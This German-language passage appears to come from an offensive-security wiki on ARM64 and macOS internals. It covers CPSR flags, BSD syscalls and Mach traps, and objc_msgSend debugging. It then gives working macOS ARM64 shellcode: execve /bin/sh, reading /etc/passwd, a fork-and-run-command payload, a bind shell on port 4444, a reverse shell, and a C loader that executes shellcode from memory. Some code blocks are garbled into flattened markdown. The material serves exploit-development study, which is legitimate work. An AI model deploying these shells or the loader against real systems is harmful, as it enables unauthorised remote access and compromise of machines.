### CPSR - Aktueller Programmstatusregister

In AArch32 funktioniert der CPSR ähnlich wie **`PSTATE`** in AArch64 und wird auch in **`SPSR_ELx`** gespeichert, wenn eine Ausnahme auftritt, um später die Ausführung wiederherzustellen:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Die Felder sind in einige Gruppen unterteilt:

* Anwendungsprogrammstatusregister (APSR): Arithmetische Flags und von EL0 aus zugänglich
* Ausführungsstatusregister: Verhaltensweise des Prozesses (vom Betriebssystem verwaltet).

#### Anwendungsprogrammstatusregister (APSR)

* Die Flags **`N`**, **`Z`**, **`C`**, **`V`** (genau wie in AArch64)
* Das Flag **`Q`**: Es wird auf 1 gesetzt, wenn während der Ausführung eines spezialisierten sättigenden arithmetischen Befehls eine **ganzzahlige Sättigung auftritt**. Sobald es auf **`1`** gesetzt ist, behält es den Wert bei, bis es manuell auf 0 gesetzt wird. Darüber hinaus gibt es keinen Befehl, der seinen Wert implizit überprüft, dies muss manuell gelesen werden.
* **`GE`** (Größer oder gleich) Flags: Es wird in SIMD (Single Instruction, Multiple Data) Operationen verwendet, wie "paralleles Addieren" und "paralleles Subtrahieren". Diese Operationen ermöglichen die Verarbeitung mehrerer Datenpunkte in einem einzigen Befehl.

Zum Beispiel fügt der Befehl **`UADD8`** **vier Byte-Paare** (aus zwei 32-Bit-Operanden) parallel hinzu und speichert die Ergebnisse in einem 32-Bit-Register. Dann **setzt er die `GE`-Flags im `APSR`** basierend auf diesen Ergebnissen. Jedes GE-Flag entspricht einer der Byte-Additionen und zeigt an, ob die Addition für dieses Byte-Paar **überlaufen ist**.

Der Befehl **`SEL`** verwendet diese GE-Flags, um bedingte Aktionen auszuführen.

#### Ausführungsstatusregister

* Die Bits **`J`** und **`T`**: **`J`** sollte 0 sein und wenn **`T`** 0 ist, wird der Befehlssatz A32 verwendet, und wenn er 1 ist, wird T32 verwendet.
* **IT-Block-Statusregister** (`ITSTATE`): Dies sind die Bits von 10-15 und 25-26. Sie speichern Bedingungen für Befehle innerhalb einer mit **`IT`** vorangestellten Gruppe.
* Das Bit **`E`**: Gibt die **Byte-Reihenfolge** an.
* **Modus- und Ausnahmemaskenbits** (0-4): Sie bestimmen den aktuellen Ausführungszustand. Das **5.** Bit gibt an, ob das Programm als 32-Bit (eine 1) oder 64-Bit (eine 0) ausgeführt wird. Die anderen 4 repräsentieren den **derzeit verwendeten Ausnahmemodus** (wenn eine Ausnahme auftritt und behandelt wird). Die gesetzte Nummer gibt die **aktuelle Priorität** an, falls eine weitere Ausnahme ausgelöst wird, während diese behandelt wird.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: Bestimmte Ausnahmen können mit den Bits **`A`**, `I`, `F` deaktiviert werden. Wenn **`A`** 1 ist, bedeutet dies, dass **asynchrone Abbrüche** ausgelöst werden. Das **`I`** konfiguriert die Reaktion auf externe Hardware-**Interruptanfragen** (IRQs). und das F bezieht sich auf **Fast Interrupt Requests** (FIRs).

## macOS

### BSD-Systemaufrufe

Schauen Sie sich [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) an. BSD-Systemaufrufe haben **x16 > 0**.

### Mach-Fallen

Schauen Sie sich in [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) die `mach_trap_table` und in [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) die Prototypen an. Die maximale Anzahl von Mach-Fallen beträgt `MACH_TRAP_TABLE_COUNT` = 128. Mach-Fallen haben **x16 < 0**, daher müssen Sie die Nummern aus der vorherigen Liste mit einem **Minuszeichen** aufrufen: **`_kernelrpc_mach_vm_allocate_trap`** ist **`-10`**.

Sie können auch **`libsystem_kernel.dylib`** in einem Disassembler überprüfen, um herauszufinden, wie diese (und BSD) Systemaufrufe aufgerufen werden:

{% code overflow="wrap" %}
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

{% hint style="success" %}
Manchmal ist es einfacher, den **decompilierten** Code von **`libsystem_kernel.dylib`** zu überprüfen, **als** den **Quellcode** zu überprüfen, da der Code mehrerer Syscalls (BSD und Mach) über Skripte generiert wird (überprüfen Sie die Kommentare im Quellcode), während Sie im Dylib finden können, was aufgerufen wird.
{% endhint %}

### machdep-Aufrufe

XNU unterstützt einen anderen Typ von Aufrufen, die maschinenabhängig genannt werden. Die Anzahl dieser Aufrufe hängt von der Architektur ab, und weder die Aufrufe noch die Nummern sind garantiert konstant zu bleiben.

### comm page

Dies ist eine Kernel-Eigentümer-Speicherseite, die in den Adressraum jedes Benutzerprozesses abgebildet ist. Sie soll den Übergang vom Benutzermodus zum Kernelraum schneller machen als die Verwendung von Syscalls für Kerneldienste, die so häufig verwendet werden, dass dieser Übergang sehr ineffizient wäre.

Zum Beispiel liest der Aufruf `gettimeofdate` den Wert von `timeval` direkt von der comm page.

### objc\_msgSend

Es ist sehr häufig, diese Funktion in Objective-C- oder Swift-Programmen zu finden. Diese Funktion ermöglicht es, eine Methode eines Objective-C-Objekts aufzurufen.

Parameter ([mehr Informationen in der Dokumentation](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Zeiger auf die Instanz
* x1: op -> Selektor der Methode
* x2... -> Rest der Argumente der aufgerufenen Methode

Daher können Sie, wenn Sie einen Breakpoint vor dem Sprung zu dieser Funktion setzen, leicht herausfinden, was in lldb aufgerufen wird (in diesem Beispiel ruft das Objekt ein Objekt von `NSConcreteTask` auf, das einen Befehl ausführen wird):

```
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```

### Shellcodes

Zum Kompilieren:

```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```

Um die Bytes zu extrahieren:

```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```

<details>

<summary>C-Code zum Testen des Shellcodes</summary>

\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include

int (\*sc)();

char shellcode\[] = "";

int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);

if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);

void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);

if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);

printf("\[>] Trying to execute shellcode...\n");

sc = ptr; sc();

return 0; }

````
</details>

#### Shell

Entnommen von [**hier**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) und erklärt.

<div data-gb-custom-block data-tag="tabs"></div>

<div data-gb-custom-block data-tag="tab" data-title='mit adr'>

```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
````



\`\`\`armasm .section \_\_TEXT,\_\_text ; This directive tells the assembler to place the following code in the \_\_text section of the \_\_TEXT segment. .global \_main ; This makes the \_main label globally visible, so that the linker can find it as the entry point of the program. .align 2 ; This directive tells the assembler to align the start of the \_main function to the next 4-byte boundary (2^2 = 4).

\_main: ; We are going to build the string "/bin/sh" and place it on the stack.

mov x1, #0x622F ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'. movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'. movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'. movk x1, #0x68, lsl #48 ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str x1, \[sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov x1, #8 ; Set x1 to 8. sub x0, sp, x1 ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack. mov x1, xzr ; Clear x1, because we need to pass NULL as the second argument to execve. mov x2, xzr ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov x16, #59 ; Move the execve syscall number (59) into x16. svc #0x1337 ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

````
#### Lesen mit cat

Das Ziel ist es, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen, daher ist das zweite Argument (x1) ein Array von Parametern (was im Speicher einem Stapel von Adressen entspricht).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
````

**Befehl mit sh von einem Fork aufrufen, damit der Hauptprozess nicht beendet wird**

```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```

**Bind-Shell**

Bind-Shell von [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) auf **Port 4444**.

```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```

**Umgekehrte Shell**

Von [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell zu **127.0.0.1:4444**

```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```



</details>
